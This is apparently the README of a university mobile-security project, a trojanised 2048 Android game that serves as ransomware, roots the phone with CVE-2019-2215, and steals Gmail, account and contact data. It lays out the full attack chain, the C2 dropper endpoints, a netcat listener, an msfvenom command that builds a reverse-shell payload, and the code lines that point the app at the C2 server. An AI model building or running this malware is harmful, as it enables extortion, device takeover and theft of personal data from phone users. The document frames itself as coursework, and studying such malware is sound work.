# Rootsmart 2.0 w/ cve-2019-2215 + Ransomware

### Disclaimer
This project is solely for educational purposes. This project utilise code from [rkshrksh/2048-Game](https://github.com/rkshrksh/2048-Game) and [kangtastic/cve-2019-2215](https://github.com/kangtastic/cve-2019-2215).

---

## Project Description

This project is part of Singapore Institute of Technology Mobile Security module. The project was done within 6 weeks and the aim of the project was to develop a malicious android application. By doing so, it helped us to learn how security mechanisms are implemented in an Android OS and how we can exercise OWASP Mobile Top 10:2017 M8 - Code Tampering.

The project is proof of concept to showcase a custom written ransomware that utilises AES encryption, weaponising cve-2019-2215, and also exfiltrating data from the infected device.

It is tested on Android 10 and Google Pixel 2 XL.

```
├── 2048-Game 					// Android Project Folder
├── 2048-keystore				// Test-Keystore
├── cve-2019-2215				// Modified cve-2019-2215
│	└── cve-2019-2215.c
├── dropper_server				// Dropper server directory 
│	├── cve-2019-2215			// shells.zip content before zipping
│	├── dropper_server.py		// Dropper server program
│	├── exfiltrated_data.log
│	├── masterkeys.txt
│	├── ncat.exe 				// Netcat windows binary - for Reverse shell listener
│	├── requirements.txt
│	├── shells.zip  			// shells.zip that is hosted in root of dropper server
│	└── venv
└── test_images    				// test_images for easy adb push <image.ext> /sdcard/Pictures
```


##### Attack Vector:

1. Install, run the application and grant permissions
2. Ransomware will AES encrypt all files in /sdcard/Pictures
3. Each file will be encrypted with a random generated key
4. Keys will be stored in /sdcard/keys.json where each key:value pair is filepath:key
5. GET HTTP to C2 server /get_mk to retrieve MasterKey and VictimID in response body
6. MasterKey will encrypt keys.json, VictimID will be stored in /sdcard/victimID.txt
7. The application will download shells.zip and unzip the contents
8. Execute cve-2019-2215 binary from the unzipped contents
9. A root shell process will be spawn and will run install.sh from the unzipped contents
10. Install.sh will execute rs.elf from the unzipped contents to send a reverse connection to attack server
11. The appliation will exfiltrate the device's gmail, user account information, and contacts.


##### Demonstration
https://user-images.githubusercontent.com/56181271/155875246-092a3954-2f42-42b7-a00e-581a1bbf0546.mp4

---

## C2 (Command & Control) - Setup
For this test, ensure that the victim phone and the C2 server are in the same subnet (otherwise host C2 in public internet). There are 3 endpoints for the C2 server that can be found in dropper/dropper_server.py:

1. /process_command - GET to download shells.zip and run the cve-2019-2215 root exploit
2. /get_mk - GET to obtain the victimID:masterkey key-value pair to encrypt /sdcard/keys.json
3. /postData - POST exfiltrated gmail, contacts, account information

##### Reverse Shell Server
```bash
nc -lvnp 1337 # Ideally this should be the same IP as the dropper server
```

##### Dropper Server
```bash
# Generate rs.elf payload
msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> -f elf > rs.elf

# Better to run flask on Windows if WSL don't port forward localhost traffic to Windows Host
cd dropper
python3 -m venv venv # Create venv

# Activate venv
. venv/bin/activate # Linux
venv\Scripts\activate.bat # Windows
pip install -r requirements.txt --upgrade pip # Make sure host shell is root/Administrator

# Run C2 server
python3 dropper_server.py # WSL
python dropper_server.py # Windows
```

shells.zip in /dropper
1. Go to dropper/cve-2019-2215 folder
2. After creating rs.elf, zip rs.elf + cve-2019-2215, install.sh
3. Rename zip file to shells.zip
4. Move shells.zip to /dropper

## Modify the following before compiling APK

Java Classes
```java
// File : 2048-Game/app/src/main/java/aarkay/a2048game/Temproot.java
// Change IP and port according to dropper server IP and port
String URL = "http://192.168.157.73:8080/process_command"; // Line 19

// File : 2048-Game/app/src/main/java/aarkay/a2048game/Encrypt.java
// Change IP and port according to dropper server IP and port
String URL = "http://192.168.157.73:8080/get_mk"; // Line 45

// File : 2048-Game/app/src/main/java/aarkay/a2048game/PostData.java
// Change IP and port according to dropper server IP and port
String urlString = "http://192.168.157.73:8080/postData"; // Line 32
```





